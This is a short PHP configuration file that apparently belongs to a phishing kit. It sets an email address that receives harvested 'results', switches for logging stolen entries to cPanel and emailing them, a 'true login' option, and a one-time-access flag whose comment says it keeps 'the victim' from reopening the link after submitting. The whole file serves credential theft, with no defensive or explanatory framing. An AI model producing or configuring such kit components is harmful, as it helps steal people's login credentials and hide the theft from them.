<?php

$recipient = "netlover.og@yandex.com"; // put your email here
$savelog = true; // save results to cpanel
$sendlog = true; // send results to email
$truelogin = true; // enable / disable true login
$One_Time_Access=0; // ONE TIME ACCESS, THIS PREVENTS THE VICTIM FROM LOADING THE LINK AGAIN AFTER SUBMIT

?>